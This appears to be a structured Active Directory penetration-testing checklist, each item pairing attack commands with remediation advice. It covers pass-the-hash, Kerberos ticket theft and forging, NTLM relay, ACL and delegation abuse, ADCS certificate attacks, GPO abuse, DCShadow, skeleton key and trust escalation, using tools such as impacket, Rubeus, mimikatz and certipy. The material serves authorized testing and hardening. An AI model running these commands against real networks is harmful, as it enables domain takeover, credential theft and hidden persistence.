Run commands using the hash:

```
nxc smb <ip> -u <user> -H <nthash> -x "whoami"
wmiexec.py -hashes :<nthash> <domain>/<user>@<ip>
```
items.how_to_fix: Same as PtH controls: LAPS, Credential Guard, tiering, least local-admin, SMB signing. Rotate the exposed hash (change password). Re-test.

references.title: The Hacker Recipes - Pass the hash

items.title: Exploit local admin hash reuse
items.description: Identify shared local Administrator password hashes (where LAPS is absent) and pass them across all matching hosts.
items.how_to_find:
Spray a local admin hash across the estate:

```
nxc smb <range> -u administrator -H <local-admin-hash> --local-auth --continue-on-success
```
items.how_to_fix: Deploy LAPS so every local admin password/hash is unique, disable/limit the local admin account, and enable network-logon restrictions for local accounts. Re-test reuse fails.

references.title: The Hacker Recipes - Pass the hash

items.title: Overpass-the-Hash to a Kerberos TGT
items.description: Convert an NT/AES hash into a Kerberos TGT (overpass-the-hash) so subsequent access uses Kerberos rather than NTLM, blending in better and enabling Kerberos-only services.
items.how_to_find:
Turn an NT/AES key into a Kerberos TGT (avoids NTLM detections):

```
getTGT.py <domain>/<user> -hashes :<nthash>
# or Rubeus asktgt /user:<u> /rc4:<nthash>
```
items.how_to_fix: Disable RC4 (enforce AES), enable Credential Guard, tier admins, and monitor for anomalous TGT requests. Rotate exposed keys. Re-test.

references.title: The Hacker Recipes - Overpass the hash

items.title: Pass AES keys where RC4 is disabled
items.description: When environments disable RC4 and require AES, use recovered AES128/AES256 keys for authentication instead of the legacy NT hash, ensuring lateral movement still works under hardened crypto policy.
items.how_to_find:
Use AES keys instead of RC4:

```
getTGT.py <domain>/<user> -aesKey <aes256key>
# Rubeus asktgt /user:<u> /aes256:<key>
```
items.how_to_fix: Protect key material (Credential Guard, tiering), rotate exposed keys/passwords, and monitor Kerberos anomalies. Re-test.

references.title: The Hacker Recipes - Pass the key

items.title: Harvest Kerberos tickets
items.description: Extract TGTs and service tickets from memory or the ticket cache on compromised hosts.
items.how_to_find:
Extract tickets for reuse:

```
Rubeus.exe dump /nowrap
# mimikatz sekurlsa::tickets /export
```
items.how_to_fix: Enable Credential Guard, restrict privileged logons (tiering, Protected Users), and shorten ticket lifetimes. Re-test harvesting is blocked.

references.title: The Hacker Recipes - Pass the ticket

items.title: Inject tickets into a session
items.description: Load a stolen ticket into the current logon session (Rubeus ptt / Mimikatz kerberos::ptt) and access resources as the ticket owner without their password or hash.
items.how_to_find:
Pass a stolen ticket:

```
Rubeus.exe ptt /ticket:<b64-or-kirbi>
# mimikatz kerberos::ptt ticket.kirbi
```
items.how_to_fix: Same ticket-theft controls: Credential Guard, tiering, short lifetimes, and monitor for anomalous ticket use. Rotate accounts if a TGT was stolen. Re-test.

references.title: The Hacker Recipes - Pass the ticket

items.title: Reuse ccache tickets on Linux/impacket
items.description: Convert tickets to ccache format and set KRB5CCNAME so impacket tools authenticate via Kerberos, enabling cross-platform ticket reuse from an attacker Linux host.
items.how_to_find:
Use a stolen ccache with impacket:

```
export KRB5CCNAME=ticket.ccache
psexec.py -k -no-pass <domain>/<user>@<host>
```
items.how_to_fix: Protect ticket caches (host hardening, least privilege), tier admins, and monitor. Rotate accounts if tickets were stolen. Re-test.

references.title: The Hacker Recipes - Pass the ticket

items.title: Request service tickets with a stolen TGT
items.description: Use an injected TGT to request TGS tickets for specific services (CIFS, HOST, LDAP, MSSQL), enabling targeted access without re-authenticating.
items.how_to_find:
Use a stolen TGT to request service tickets:

```
Rubeus.exe asktgs /ticket:<tgt> /service:cifs/<host> /ptt
```
items.how_to_fix: Credential Guard + tiering + short TGT lifetimes; rotate the affected account. Monitor for TGS requests inconsistent with the user. Re-test.

references.title: The Hacker Recipes - Pass the ticket
MITRE ATT&CK - Use Alternate Auth Material (T1550)

items.title: Overpass-the-Hash into a fresh TGT
items.description: When you hold only a hash/key, request a brand-new TGT from the KDC (overpass-the-hash) and proceed with Pass-the-Ticket, bridging NTLM credential material into the Kerberos world.
items.how_to_find:
Mint a fresh TGT from a hash/key:

```
Rubeus.exe asktgt /user:<u> /rc4:<nthash> /ptt
```
items.how_to_fix: Disable RC4 (AES only), enable Credential Guard, tier admins, and rotate exposed keys. Re-test.

references.title: The Hacker Recipes - Overpass the hash

items.title: Execute via SMB/PSExec-style service creation
items.description: Use psexec-style execution (service creation over SMB with named-pipe I/O) to run commands as SYSTEM on hosts where you hold admin.
items.how_to_find:
Run commands by creating a remote service:

```
psexec.py <domain>/<user>:<pass>@<ip>
nxc smb <ip> -u <user> -p <pass> -x "whoami"
```
items.how_to_fix: Restrict local/domain admin, segment admin protocols to jump hosts, require SMB signing, and deploy EDR (service-creation detections 7045). Rotate exposed creds. Re-test.

items.title: Execute via WMI
items.description: Use WMI (wmiexec) to run commands without installing a service, reducing artifacts compared to PSExec.
items.how_to_find:
Remote exec via WMI (no service artifact):

```
wmiexec.py <domain>/<user>:<pass>@<ip>
```
items.how_to_fix: Restrict admin, monitor WMI activity, segment management, and deploy EDR. Rotate exposed creds. Re-test.

references.title: The Hacker Recipes - WMI lateral movement

items.title: Execute via WinRM
items.description: Use WinRM (evil-winrm, PowerShell remoting) on hosts where port 5985/5986 is open and the user is in Remote Management Users or local admins, providing an interactive PowerShell session.
items.how_to_find:
Remote exec via WinRM/PSRemoting:

```
evil-winrm -i <ip> -u <user> -p <pass>
```
items.how_to_fix: Restrict WinRM to admins/jump hosts, use HTTPS + auth hardening, log PowerShell/WinRM, and deploy EDR. Rotate exposed creds. Re-test.

references.title: The Hacker Recipes - WinRM lateral movement

items.title: Execute via DCOM
items.description: Abuse DCOM objects (MMC20.Application, ShellWindows, ShellBrowserWindow) to execute commands on remote hosts, a stealthier lateral path that avoids service creation and named pipes.
items.how_to_find:
Remote exec via DCOM objects (e.g. MMC20, ShellWindows):

```
dcomexec.py <domain>/<user>:<pass>@<ip>
```
items.how_to_fix: Restrict admin, harden DCOM/firewall, monitor for DCOM lateral movement, and deploy EDR. Rotate creds. Re-test.

references.title: The Hacker Recipes - DCOM lateral movement
MITRE ATT&CK - Distributed Component Object Model (T1021.003)

items.title: Execute via scheduled tasks / service control
items.description: Create remote scheduled tasks (atexec) or remote services (sc) for execution where other protocols are blocked, offering an alternative when SMB exec or WinRM is filtered.
items.how_to_find:
Remote exec via schtasks/sc:

```
atexec.py <domain>/<user>:<pass>@<ip> "whoami"
```
items.how_to_fix: Restrict admin, monitor scheduled-task/service creation (4698/7045), segment management, and deploy EDR. Rotate creds. Re-test.

items.title: Relay to SMB for execution or SAM dump
items.description: Relay captured/coerced NTLM authentication to SMB on hosts lacking signing to execute commands or dump the SAM as the relayed user.
items.how_to_find:
Relay coerced/poisoned NTLM to SMB (no signing):

```
ntlmrelayx.py -tf targets.txt -smb2support -c 'whoami'   # or --dump-sam
```
items.how_to_fix: Require SMB signing on all hosts (GPO), disable NTLM where possible, and remove the capture/coercion source (LLMNR/NBT-NS, PetitPotam). Re-test relay fails.

items.title: Relay to LDAP/LDAPS for directory writes
items.description: Relay machine or user authentication to LDAP/LDAPS to grant DCSync rights, configure RBCD on a computer object, or add a user to a privileged group when channel binding/signing is not enforced.
items.how_to_find:
Relay to LDAP to write directory objects (e.g. set RBCD, add computer):

```
ntlmrelayx.py -t ldaps://<dc-ip> --delegate-access --escalate-user <you>
```
items.how_to_fix: Enforce LDAP signing + channel binding (LDAPS), disable NTLM where possible, and remove coercion sources. Re-test LDAP relay fails.

items.title: Relay to ADCS HTTP enrollment (ESC8)
items.description: Coerce a DC or privileged machine and relay its NTLM authentication to the ADCS web enrollment endpoint to obtain a certificate for that machine, then use the cert to authenticate (PKINIT) and pivot to DCSync.
items.how_to_find:
Relay coerced DC auth to the CA web enrollment to obtain a DC certificate:

```
ntlmrelayx.py -t http://<ca>/certsrv/certfnsh.asp --adcs --template DomainController
```

Then authenticate as the DC with the cert = domain compromise (critical).
items.how_to_fix: Disable NTLM on the CA web enrollment, enable EPA + require HTTPS, remove/harden vulnerable endpoints, patch coercion (PetitPotam), and require SMB/LDAP signing. Re-test ESC8 relay fails.

items.title: Chain coercion with cross-protocol relay
items.description: Combine a coercion trigger (PetitPotam/PrinterBug/DFSCoerce) with a relay target to force a high-value machine (often a DC) to authenticate and relay it where it does the most damage (LDAP or ADCS).
items.how_to_find:
Combine forced auth with relay to a different protocol:

```
coercer coerce -t <dc> -l <me> ...   # then ntlmrelayx to LDAP/ADCS
```
items.how_to_fix: Patch coercion vectors, disable Print Spooler on DCs, enforce signing/EPA/channel binding on all relay targets, and disable NTLM where feasible. Re-test the chain fails.

items.title: Assess relay mitigations (signing/EPA/channel binding)
items.description: Evaluate whether SMB signing, LDAP signing, LDAP channel binding, and Extended Protection for Authentication are enforced.
items.how_to_find:
Inventory whether signing/EPA/channel-binding are enforced:

```
nxc smb <range> --gen-relay-list relay.txt      # SMB signing not required
nxc ldap <dc-ip> -u <user> -p <pass> -M ldap-checker   # LDAP signing/CB
```
items.how_to_fix: Enforce SMB signing everywhere, LDAP signing + channel binding on DCs, and EPA on web/ADCS enrollment; disable NTLM where possible. Re-run the checks to confirm mitigations are on.

references.title: Microsoft - LDAP channel binding and signing

items.title: Reset a target password (ForceChangePassword/GenericAll)
items.description: With ForceChangePassword or GenericAll over a user, reset their password to a known value, then authenticate as them.
items.how_to_find:
With `ForceChangePassword`/`GenericAll`, reset the victim's password:

```
net rpc password <victim> -U <domain>/<you>%<pass> -S <dc>
# or: Set-DomainUserPassword -Identity <victim> -AccountPassword <pw>
```
items.how_to_fix: Remove the excessive right from non-admins, restore protected-object ACLs, monitor password-reset events (4724), and tier administration. Re-audit the DACL.

items.title: Add yourself to a privileged group (GenericWrite/WriteMember)
items.description: With write access to a group, add a controlled account to it.
items.how_to_find:
With write to a group's membership, add yourself:

```
net rpc group addmem "<group>" <you> -U <domain>/<you>%<pass> -S <dc>
# or: Add-DomainGroupMember -Identity '<group>' -Members <you>
```
items.how_to_fix: Remove write access to privileged group membership, protect groups via AdminSDHolder/SDProp, monitor 4728/4732, and alert on privileged-group changes. Re-audit ACLs.

references.title: SpecterOps - An ACE Up the Sleeve

items.title: Grant DCSync via WriteDACL on the domain
items.description: With WriteDACL on the domain object, add an ACE granting the replication extended rights to a controlled principal, then perform DCSync.
items.how_to_find:
With `WriteDacl` on the domain head, grant yourself replication rights, then DCSync:

```
dacledit.py -action write -rights DCSync -principal <you> -target-dn "DC=corp,DC=local" <domain>/<you>:<pass>
secretsdump.py -just-dc <domain>/<you>:<pass>@<dc>
```
items.how_to_fix: Remove `WriteDacl`/`WriteOwner` on the domain object from non-admins, monitor DACL changes + 4662, and restore correct ACLs. Re-audit domain-object permissions.

items.title: Abuse write to msDS-KeyCredentialLink (Shadow Credentials)
items.description: With GenericWrite/GenericAll over a target, add a key credential (Shadow Credentials) and authenticate as the target via PKINIT, recovering its NT hash without changing its password.
items.how_to_find:
Add a key credential to a target and authenticate as them via PKINIT:

```
certipy shadow auto -u <you>@<domain> -p <pass> -account <victim>
# or Whisker add /target:<victim>
```
items.how_to_fix: Remove write access to `msDS-KeyCredentialLink` from non-admins, monitor writes, and protect privileged objects. Re-audit ACLs.

items.title: Take ownership via WriteOwner then rewrite the DACL
items.description: With WriteOwner on an object, set yourself as owner, grant yourself full control via WriteDACL, and then exercise any of the above primitives.
items.how_to_find:
With `WriteOwner`, set yourself owner, grant full control, then abuse it:

```
owneredit.py -action write -new-owner <you> -target <victim> <domain>/<you>:<pass>
dacledit.py -action write -rights FullControl -principal <you> -target <victim> ...
```
items.how_to_fix: Remove `WriteOwner` from non-admins, restore correct owners/ACLs on privileged objects, and monitor owner/DACL changes. Re-audit.

references.title: SpecterOps - An ACE Up the Sleeve

sections.title: Privilege Escalation & Delegation — Kerberos Delegation Abuse

items.title: Abuse unconstrained delegation
items.description: On a host trusted for unconstrained delegation, capture TGTs of any user that authenticates to it.
items.how_to_find:
On a host with unconstrained delegation, capture TGTs of connecting users (esp. coerce a DC):

```
Rubeus.exe monitor /interval:5 /nowrap
# coerce a DC to authenticate, then extract its TGT
```

DC TGT = domain compromise (critical).
items.how_to_fix: Remove unconstrained delegation (use constrained/RBCD with protocol restrictions), add privileged accounts to Protected Users / mark "sensitive & cannot be delegated", and disable Print Spooler on DCs. Re-audit delegation flags.

items.title: Abuse constrained delegation (S4U2Self/S4U2Proxy)
items.description: On an account configured for constrained delegation, use S4U2Self and S4U2Proxy to obtain a service ticket impersonating any user (including DA) to the allowed target service.
items.how_to_find:
With constrained delegation + a controlled account, impersonate any user to the allowed service:

```
getST.py -spn cifs/<target> -impersonate administrator <domain>/<svc>:<pass> -dc-ip <dc>
```
items.how_to_fix: Restrict which accounts have constrained delegation, avoid protocol transition (`TrustedToAuthForDelegation`) where possible, protect sensitive accounts (Protected Users / not-delegatable), and monitor S4U. Re-audit delegation config.

items.title: Abuse resource-based constrained delegation (RBCD)
items.description: With write access to a computer object (or a created machine account), set msDS-AllowedToActOnBehalfOfOtherIdentity to a controlled SPN, then use S4U to impersonate any user to that computer.
items.how_to_find:
If you can write `msDS-AllowedToActOnBehalfOfOtherIdentity` on a target, set RBCD to a controlled computer account and impersonate:

```
rbcd.py -delegate-to <target$> -delegate-from <you$> -action write <domain>/<you>:<pass>
getST.py -spn cifs/<target> -impersonate administrator <domain>/<you$>:<pass>
```
items.how_to_fix: Remove write access to `msDS-AllowedToActOnBehalfOfOtherIdentity` from non-admins, restrict `ms-DS-MachineAccountQuota` to 0, protect privileged accounts, and monitor the attribute. Re-audit ACLs.

items.title: Create a machine account for delegation abuse
items.description: Where MachineAccountQuota allows, create a new computer account you control to serve as the delegation source for RBCD attacks, removing the need for an existing controllable SPN.
items.how_to_find:
Add a computer account (default quota lets any user add 10) to use in RBCD/S4U:

```
addcomputer.py -computer-name 'evil$' -computer-pass <pass> <domain>/<user>:<pass> -dc-ip <dc>
```
items.how_to_fix: Set `ms-DS-MachineAccountQuota` to 0 (only delegated admins add computers), monitor computer-account creation (4741), and restrict delegation-related ACLs. Re-check the quota.

items.title: Self-RBCD and protocol transition edge cases
items.description: Explore edge cases such as configuring RBCD on a computer you already partly control or leveraging protocol transition (TrustedToAuthForDelegation) to impersonate even without the user authenticating.
items.how_to_find:
Explore self-RBCD / protocol-transition edges where a computer can act on behalf of users to its own services:

```
# analyze in BloodHound; abuse via rbcd.py + getST.py as above
```
items.how_to_fix: Audit and minimize delegation config (constrained/RBCD, protocol transition), protect privileged accounts, set machine-account quota to 0, and monitor. Re-assess delegation edges in BloodHound.

sections.title: Privilege Escalation & Delegation — ADCS Certificate Abuse (ESC1-ESC8)

items.title: Enumerate CAs and vulnerable templates
items.description: Enumerate certificate authorities, published templates, and their security settings with Certipy/Certify to identify ESC1-ESC8 misconfigurations such as enrollee-supplied SAN, dangerous EKUs, or weak enrollment ACLs.
items.how_to_find:
Find CAs and misconfigured templates (ESC1-ESC8):

```
certipy find -u <user>@<domain> -p <pass> -dc-ip <dc-ip> -vulnerable -stdout
```
items.how_to_fix: Remediate each flagged template: remove enrollee-supplied SAN (ESC1), require manager approval/authorized signatures, restrict enroll rights, and fix CA flags (ESC6/7). Re-run certipy to confirm none are vulnerable.

items.title: Exploit ESC1 (enrollee-supplied SAN)
items.description: On a template allowing enrollee-supplied subjectAltName with client-auth EKU, request a certificate specifying a privileged user in the SAN, then authenticate as that user via PKINIT.
items.how_to_find:
Request a cert specifying an arbitrary SAN (e.g. a DA), then authenticate as them:

```
certipy req -u <user>@<domain> -p <pass> -ca <CA> -template <vuln> -upn administrator@<domain>
certipy auth -pfx administrator.pfx -dc-ip <dc>
```
items.how_to_fix: Disable `ENROLLEE_SUPPLIES_SUBJECT` on the template, require manager approval, restrict enroll permissions to intended principals, and enable CA auditing. Re-run certipy to confirm ESC1 is fixed.

items.title: Exploit CA-level flaws (ESC6/ESC7)
items.description: Abuse EDITF_ATTRIBUTESUBJECTALTNAME2 on the CA (ESC6) to specify arbitrary SANs on any template, or abuse Manage CA/Manage Certificates rights (ESC7) to issue or approve certificates and escalate.
items.how_to_find:
ESC6: CA has `EDITF_ATTRIBUTESUBJECTALTNAME2` (SAN in any request). ESC7: you hold CA management rights:

```
certipy find ... -stdout   # confirm ESC6/ESC7
certipy ca -u <user>@<domain> -p <pass> -ca <CA> -add-officer <you>   # ESC7 abuse
```
items.how_to_fix: Remove `EDITF_ATTRIBUTESUBJECTALTNAME2` (ESC6), restrict CA ManageCA/ManageCertificates rights (ESC7) to authorized admins, and audit CA config. Re-scan.

items.title: Exploit ESC8 (NTLM relay to web enrollment)
items.description: Coerce a privileged machine and relay its NTLM authentication to the unauthenticated/NTLM web enrollment endpoint to obtain a certificate for that machine, then PKINIT and DCSync.
items.how_to_find:
Relay coerced DC auth to CA web enrollment for a DC cert:

```
certipy relay -target http://<ca>/certsrv/ -template DomainController
# coerce the DC (PetitPotam) to authenticate
```
items.how_to_fix: Disable NTLM on the CA web enrollment, enable EPA + HTTPS, remove the web enrollment role if unused, patch coercion, and require signing. Re-test ESC8 relay fails.

items.title: Use certificates for stealthy persistence
items.description: Enroll long-lived certificates (or steal existing ones) to maintain authentication ability that survives password resets, leveraging the certificate validity period for durable access.
items.how_to_find:
Request a long-lived user/machine cert for durable auth (survives password changes):

```
certipy req -u <user>@<domain> -p <pass> -ca <CA> -template User
# authenticate anytime with the pfx via PKINIT
```
items.how_to_fix: Monitor certificate issuance, restrict enrollment, shorten validity for sensitive templates, and revoke/rotate the CA if abuse is suspected (cert-based auth survives password resets). Re-audit issued certs.

sections.title: Privilege Escalation & Delegation — GPO Modification Abuse

items.title: Find writable GPOs and their links
items.description: Enumerate GPOs over which a controlled principal holds edit rights and the OUs/domains they are linked to, scoping which machines and users would be affected by a modification.
items.how_to_find:
Identify GPOs you can edit and where they apply:

```
# BloodHound edge GPO GenericWrite/WriteDacl, or:
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match 'Write'}
```
items.how_to_fix: Remove GPO write access from non-admins, restrict GPO editing to delegated admins, monitor GPO changes, and review OU/domain links. Re-audit GPO ACLs.

items.title: Add a controlled account to local administrators via GPO
items.description: Modify a writable GPO to add a controlled principal to the local Administrators group on all affected machines, granting widespread local admin once the policy refreshes.
items.how_to_find:
Abuse a writable GPO to add yourself to local admins on linked hosts:

```
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <you> --GPOName "<gpo>"
# or pyGPOAbuse
```
items.how_to_fix: Remove GPO write access, restore the GPO, monitor GPO + local-group changes, and tier administration. Re-audit and remove any planted admin. Re-verify GPO ACLs.

items.title: Deploy an immediate scheduled task via GPO
items.description: Add an immediate scheduled task to a writable GPO to execute an arbitrary payload as SYSTEM (computer policy) or in user context across all affected objects.
items.how_to_find:
Push an immediate scheduled task (runs as SYSTEM on linked hosts):

```
SharpGPOAbuse.exe --AddComputerTask --TaskName x --Command cmd.exe --Arguments "/c ..." --GPOName "<gpo>"
```
items.how_to_fix: Remove GPO write access, delete the malicious task, monitor scheduled-task creation (4698) + GPO changes, and restrict editing. Re-audit.

items.title: Inject startup/logon scripts via GPO
items.description: Place a malicious startup or logon script into the SYSVOL GPO folder and register it in the GPO so it runs on next boot or user logon across the policy scope.
items.how_to_find:
Add a startup/logon script to a writable GPO:

```
# edit \\<domain>\SYSVOL\...\Machine\Scripts\ + scripts.ini via SharpGPOAbuse/pyGPOAbuse
```
items.how_to_fix: Remove GPO write access, restore SYSVOL script config, monitor SYSVOL + GPO changes, and restrict editing. Re-audit.

items.title: Revert GPO changes and verify scope
items.description: After exploitation, revert all GPO modifications and confirm no residual scheduled tasks, local-admin entries, or scripts persist, restoring the policy to its original state.
items.how_to_find:
After testing, remove all GPO modifications and confirm affected hosts:

```
gpupdate /force   # on test hosts to confirm revert
```
items.how_to_fix: Process step: revert all GPO changes, document affected OUs/hosts, and verify no residual tasks/scripts/admins remain. Provides a clean, auditable engagement.

sections.title: Persistence & Domain Dominance — Golden, Silver & Diamond Tickets

items.title: Forge a Golden Ticket with the krbtgt key
items.description: Using the krbtgt NT hash or AES key, forge a TGT for any user (including a fabricated one) with arbitrary group membership, granting domain-wide access that persists until krbtgt is rotated twice.
items.how_to_find:
With the krbtgt hash, forge a TGT for any user:

```
ticketer.py -nthash <krbtgt-hash> -domain-sid <sid> -domain <domain> administrator
# mimikatz kerberos::golden ...
```
items.how_to_fix: Golden Tickets imply full compromise: rotate krbtgt twice (with interval), investigate initial access, monitor for anomalous TGTs (long lifetimes, mismatched RC4), and tier administration. Re-verify after krbtgt rotation.

items.title: Forge a Silver Ticket for a target service
items.description: Using a service account or machine account key, forge a TGS directly to a specific service (CIFS, HOST, MSSQL) without contacting the DC, providing stealthy targeted access.
items.how_to_find:
With a service account's hash, forge a TGS for that service (no DC contact):

```
ticketer.py -nthash <svc-hash> -domain-sid <sid> -domain <domain> -spn cifs/<host> administrator
```
items.how_to_fix: Rotate the service account key (gMSA), enforce AES, monitor service access without preceding TGS from the DC, and least-privilege service accounts. Re-verify.

items.title: Forge a Diamond Ticket to evade detection
items.description: Request a legitimate TGT and modify its decrypted contents (groups, validity) using the krbtgt key, producing a ticket that closely matches real ones and evades anomaly detection that catches Golden Tickets.
items.how_to_find:
Modify a real TGT (request then re-encrypt with krbtgt key) to blend in:

```
Rubeus.exe diamond /krbkey:<aes> /user:<u> /ticketuser:administrator ...
```
items.how_to_fix: Same as Golden: rotate krbtgt (x2), enforce AES, and improve Kerberos anomaly detection. Investigate compromise. Re-verify after rotation.

items.title: Use enterprise/inter-realm ticket variants
items.description: Leverage advanced forging variants (Sapphire/enterprise tickets, inter-realm referral tickets) to extend forged-ticket reach across the forest or to better blend with legitimate PAC data.
items.how_to_find: Forge enterprise/inter-realm tickets for cross-domain/forest movement (with the relevant trust/krbtgt key).
items.how_to_fix: Protect krbtgt + trust keys, enable SID filtering on trusts, rotate keys if exposed, and monitor cross-realm tickets. Re-verify trust hardening.

items.title: Advise on krbtgt rotation and remediation
items.description: Document that evicting Golden Ticket persistence requires resetting the krbtgt password twice (with replication between resets), and provide remediation guidance for affected service keys.
items.how_to_find:
Confirm whether krbtgt has been rotated recently and plan a double-reset (breaks all forged tickets):

```
Get-ADUser krbtgt -Properties PasswordLastSet
# use the New-KrbtgtKeys.ps1 double-reset procedure
```
items.how_to_fix: Rotate krbtgt twice with a delay >= max ticket lifetime (and after any DA compromise), automate periodic rotation, and monitor. Re-verify PasswordLastSet is recent.

references.title: Microsoft - Reset the krbtgt account password

items.title: Register a rogue DC
items.description: Use Mimikatz lsadump::dcshadow to temporarily register the attacker host as a domain controller in the configuration partition, the prerequisite for pushing replicated changes.
items.how_to_find:
With DA/equivalent, register a fake DC to push replication:

```
# mimikatz lsadump::dcshadow /object:<target> /attribute:<attr> /value:<val>
# then lsadump::dcshadow /push
```
items.how_to_fix: DCShadow requires high privilege — treat as full compromise. Restrict who can register DCs (replication rights), monitor for rogue replication (unexpected DC objects, 4662/replication from non-DCs), and tier administration. Investigate + reset.

items.title: Push stealthy directory modifications
items.description: Through the rogue DC, push attribute changes (add SID history, modify primaryGroupID, alter ACLs) that replicate to legitimate DCs without generating the usual change-audit events.
items.how_to_find: Use DCShadow to write attributes (SID history, SPNs, ACLs) without normal audit trails via the replication channel.
items.how_to_fix: Monitor replication metadata + unexpected DC registrations, restrict replication rights, and alert on DCShadow indicators. Reset affected objects. Re-audit.

items.title: Inject SID history via DCShadow
items.description: Use DCShadow to add a privileged SID (e.g., Domain Admins) to the sIDHistory of a controlled account, granting it elevated rights without visible group membership changes.
items.how_to_find: Push `sIDHistory` onto a controlled account to inherit privileged group access stealthily.
items.how_to_fix: Monitor `sIDHistory` changes, enable SID filtering on trusts, restrict replication rights, and clear illegitimate SID history. Re-audit sIDHistory across accounts.

items.title: Confirm DCShadow prerequisites
items.description: Verify the required rights (DA-equivalent, or specific replication and configuration write rights) and the second authentication context DCShadow needs, before attempting the attack.
items.how_to_find: Verify the required rights (DS-Install-Replica, replication ACEs, local admin) before attempting DCShadow.
items.how_to_fix: Restrict these rights to legitimate DCs/admins, monitor for their assignment, and tier administration. Re-audit who holds replication/DC-install rights.

items.title: Deregister the rogue DC and verify
items.description: After pushing changes, deregister the rogue DC from the configuration partition and confirm no leftover server/nTDSDSA objects remain, keeping the directory clean.
items.how_to_find:
After testing, remove the rogue DC registration and confirm cleanup:

```
# mimikatz completes/reverts the nTDSDSA object; verify no residual DC objects
```
items.how_to_fix: Process step: deregister the rogue DC, remove residual objects/attributes, and verify replication topology is clean. Provides an auditable engagement.

sections.title: Persistence & Domain Dominance — Skeleton Key, AdminSDHolder & DSRM

items.title: Inject a Skeleton Key into LSASS on a DC
items.description: Patch LSASS on a domain controller with Mimikatz misc::skeleton to add a master password that authenticates as any user alongside their real password, until the DC reboots.
items.how_to_find:
Patch LSASS on a DC so a master password works for any account (in-memory):

```
# mimikatz misc::skeleton (on a DC, requires DA)
```
items.how_to_fix: Requires DC compromise — treat as full breach. Enable Credential Guard/LSA protection, restrict DA/DC access (tiering), monitor LSASS tampering (EDR), and reboot DCs to clear. Investigate + reset credentials.

references.title: MITRE ATT&CK - Password Filter DLL / Skeleton Key (T1556.001)

items.title: Backdoor AdminSDHolder for persistent rights
items.description: Add a controlled principal to the AdminSDHolder object DACL.
items.how_to_find:
Add an ACE to AdminSDHolder so SDProp re-grants you rights on all protected groups every 60 min:

```
# add GenericAll for <you> on CN=AdminSDHolder,CN=System,DC=...
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,...' -PrincipalIdentity <you> -Rights All
```
items.how_to_fix: Audit and clean the AdminSDHolder ACL, monitor changes to it, restrict WriteDacl on it, and verify SDProp propagation. Remove the backdoor ACE and let SDProp restore protected objects. Re-audit.

items.title: Enable DSRM logon persistence
items.description: Recover or set the DSRM (Directory Services Restore Mode) local admin hash on a DC and set DsrmAdminLogonBehavior so it can authenticate over the network, giving a durable DC backdoor.
items.how_to_find:
Set the DSRM admin to allow network logon (persistent local backdoor on a DC):

```
# reg set DsrmAdminLogonBehavior=2 ; then PtH the DSRM (local admin) hash
```
items.how_to_fix: Monitor the `DsrmAdminLogonBehavior` registry value, restrict DC access, rotate the DSRM password, and alert on DSRM logons. Reset if abused. Re-audit the setting.

items.title: Plant durable ACL backdoors on key objects
items.description: Add subtle ACEs (e.g., DCSync rights, GenericAll on a service account) to durable objects so access can be re-established even if the primary foothold is remediated.
items.how_to_find: Add hidden ACEs (DCSync on domain, control of privileged groups) for persistence.
items.how_to_fix: Baseline + monitor ACLs on the domain object and privileged groups, alert on DACL changes, and remove illegitimate ACEs. Re-audit periodically.

references.title: SpecterOps - An ACE Up the Sleeve

items.title: Document and remove all persistence artifacts
items.description: Inventory every persistence mechanism planted (tickets, skeleton key, ACLs, DSRM, AdminSDHolder) and ensure each is documented for the report and fully removed at engagement close.
items.how_to_find: List every persistence mechanism established during testing (tickets, ACEs, accounts, registry, GPOs) for removal.
items.how_to_fix: Process step: remove all persistence, verify AdminSDHolder/DSRM/ACLs are clean, and confirm with the client. Recommend krbtgt rotation if forged tickets were used. Provides an auditable, clean engagement.

sections.title: Trusts & Forest — Domain Trusts & SID History Abuse

items.title: Enumerate trust relationships and directions
items.description: Map all trusts with their direction, transitivity, and type (parent-child, tree-root, external, forest), identifying which trusts can be traversed and whether SID filtering is applied.
items.how_to_find:
Map trusts (direction, transitivity, type):

```
nxc ldap <dc-ip> -u <user> -p <pass> -M enum_trusts
nltest /domain_trusts /all_trusts
```
items.how_to_fix: Recon step. Defensively: enable SID filtering + selective authentication, remove unnecessary trusts, and treat the forest as the boundary. Review trust config.

items.title: Escalate child domain to forest root via SID history
items.description: From DA in a child domain, forge an inter-realm TGT including the Enterprise Admins SID in SID history.
items.how_to_find:
Forge an inter-realm ticket with the Enterprise Admins SID in SID history (intra-forest SID filtering is off by default):

```
ticketer.py -nthash <child-krbtgt> -domain-sid <child-sid> -extra-sid <root-sid>-519 ...
```
items.how_to_fix: Understand the forest (not domain) is the security boundary; where feasible enable SID filtering/quarantine on intra-forest trusts, protect each domain's krbtgt, and monitor extra-SID tickets. Isolate tier-0 across the forest.

items.title: Abuse the trust account key (inter-realm trust ticket)
items.description: Dump the trust account (TDO) key shared between domains and forge an inter-realm TGT to access the trusted domain, leveraging the trust key rather than krbtgt.
items.how_to_find:
Use the trust account key to forge inter-realm TGTs across a trust:

```
# dump trust key (secretsdump), then ticketer.py with the inter-realm key
```
items.how_to_fix: Protect/rotate trust keys, enable SID filtering + selective authentication, remove unnecessary trusts, and monitor inter-realm tickets. Re-audit trust hardening.

items.title: Hunt foreign group memberships and ACLs across trusts
items.description: Identify principals from one domain that hold group memberships or ACL rights in a trusted domain.
items.how_to_find:
Find principals from one domain with rights in another:

```
Get-DomainForeignGroupMember -Domain <other>   # PowerView
# BloodHound cross-domain queries
```
items.how_to_fix: Remove unnecessary cross-domain memberships/ACLs, apply least privilege, enable selective authentication, and monitor cross-trust access. Re-audit foreign principals.

items.title: Assess SID filtering and selective authentication
items.description: Determine whether SID filtering, SID history quarantine, and selective authentication are enabled on each trust.
items.how_to_find:
Check trust properties for SID filtering / selective auth:

```
netdom trust <trusting> /domain:<trusted> /quarantine
Get-ADTrust -Filter * | select Name,SIDFilteringForestAware,SelectiveAuthentication
```
items.how_to_fix: Enable SID filtering (quarantine) and selective authentication on external trusts, restrict which principals can authenticate across, and remove unneeded trusts. Re-verify settings.

items.title: Abuse foreign principal access across the forest trust
items.description: Identify accounts from a trusting forest granted access (group membership, local admin, ACLs) in your forest and vice versa, then use those legitimate grants to pivot across the forest boundary.
items.how_to_find:
Enumerate and use access granted to principals across a forest trust:

```
Get-DomainForeignGroupMember -Domain <foreign>
# BloodHound: cross-forest paths
```
